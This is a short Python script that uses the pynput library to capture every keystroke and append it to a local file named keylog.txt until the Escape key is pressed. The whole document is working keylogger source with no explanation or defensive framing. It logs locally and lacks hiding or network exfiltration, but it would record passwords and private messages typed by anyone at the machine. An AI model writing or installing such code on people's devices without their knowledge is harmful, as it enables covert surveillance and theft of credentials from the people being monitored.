from pynput.keyboard import Listener, Key

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key))

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
